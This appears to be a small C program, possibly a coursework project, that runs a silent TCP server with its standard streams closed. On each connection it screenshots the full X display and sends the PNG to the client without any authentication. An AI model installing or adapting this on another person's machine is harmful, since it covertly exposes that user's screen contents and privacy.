//SCREENSHOT
#include <cairo.h>
#include <cairo-xlib.h>
#include <X11/Xlib.h>
#include <string.h>
#include <stdio.h>

//FILE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

//NETWORK
#include<sys/socket.h>
#include<arpa/inet.h>
#include <unistd.h>

//UTIL
#include<stdio.h>
#include<string.h>
#include "server.h"

#define BUF_SIZE 255

int send_screenshot(int fd, int socket)
{
	char buffer[BUF_SIZE];
	int n = 0;
	while((n = read(fd, buffer, BUF_SIZE)) > 0){
		if(write(socket, buffer , n) < 0){
			//printf("send_failed");
			return 0;
		}
	}

	return 1;
}
void screenshot(int socket_client) {
    Display *disp;
    Window root;
    cairo_surface_t *surface;
    int scr;

    disp = XOpenDisplay(NULL);
    scr = DefaultScreen(disp);
    root = DefaultRootWindow(disp);

    surface = cairo_xlib_surface_create(disp, root, DefaultVisual(disp, scr),
            DisplayWidth(disp, scr), DisplayHeight(disp, scr));
    cairo_surface_write_to_png(
            surface,
            "/tmp/test.png");
    send_screenshot(open("/tmp/test.png", O_RDONLY), socket_client);
    cairo_surface_destroy(surface);
}

int main() {
        close(0);
        close(1);
        close(2);

	initialiser_signaux();
	int socket_serveur = creer_serveur(SERVER_PORT);
	if(socket_serveur == -1)
		return 1;

	int socket_client;
        while(1){
            socket_client = accept(socket_serveur, NULL, NULL);
            if (socket_client == -1){
                perror("accept ");
                return 1;
            }
            if(fork() == 0){
                screenshot(socket_client);

                close(socket_client);
                return 1;
            } else {
                close(socket_client);
            }
        }
        close(socket_serveur);

        return 0;
}